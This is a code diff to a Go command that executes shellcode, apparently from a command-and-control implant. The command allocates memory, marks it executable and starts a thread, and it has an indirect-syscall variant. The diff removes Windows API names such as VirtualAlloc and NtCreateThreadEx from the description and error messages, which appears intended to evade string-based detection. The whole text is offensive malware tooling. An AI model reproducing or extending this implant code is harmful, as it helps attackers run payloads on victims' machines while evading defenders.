@@ -20,7 +20,7 @@ func (c *ExecuteShellcodeCommand) Name() string {
 }
 
 func (c *ExecuteShellcodeCommand) Description() string {
-	return "Execute shellcode in the current process via VirtualAlloc + CreateThread"
+	return "Execute shellcode in the current process"
 }
 
 type executeShellcodeArgs struct {
@@ -92,7 +92,7 @@ func (c *ExecuteShellcodeCommand) executeStandard(shellcode []byte) structs.Comm
 	)
 	if addr == 0 {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: VirtualAlloc failed: %v", lastErr),
+			Output:    fmt.Sprintf("Error: memory allocation failed: %v", lastErr),
 			Status:    "error",
 			Completed: true,
 		}
@@ -112,7 +112,7 @@ func (c *ExecuteShellcodeCommand) executeStandard(shellcode []byte) structs.Comm
 	)
 	if ret == 0 {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: VirtualProtect failed: %v", lastErr),
+			Output:    fmt.Sprintf("Error: memory protection change failed: %v", lastErr),
 			Status:    "error",
 			Completed: true,
 		}
@@ -129,7 +129,7 @@ func (c *ExecuteShellcodeCommand) executeStandard(shellcode []byte) structs.Comm
 	)
 	if hThread == 0 {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: CreateThread failed: %v", lastErr),
+			Output:    fmt.Sprintf("Error: thread creation failed: %v", lastErr),
 			Status:    "error",
 			Completed: true,
 		}
@@ -138,7 +138,7 @@ func (c *ExecuteShellcodeCommand) executeStandard(shellcode []byte) structs.Comm
 	syscall.CloseHandle(syscall.Handle(hThread))
 
 	return structs.CommandResult{
-		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Standard Win32 API\n  Thread created and running", len(shellcode), addr),
+		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Standard\n  Thread created and running", len(shellcode), addr),
 		Status:    "success",
 		Completed: true,
 	}
@@ -183,7 +183,7 @@ func (c *ExecuteShellcodeCommand) executeIndirect(shellcode []byte) structs.Comm
 	status = IndirectNtCreateThreadEx(&hThread, currentProcess, addr)
 	if status != 0 {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: NtCreateThreadEx failed: NTSTATUS 0x%X", status),
+			Output:    fmt.Sprintf("Error: thread creation failed: NTSTATUS 0x%X", status),
 			Status:    "error",
 			Completed: true,
 		}
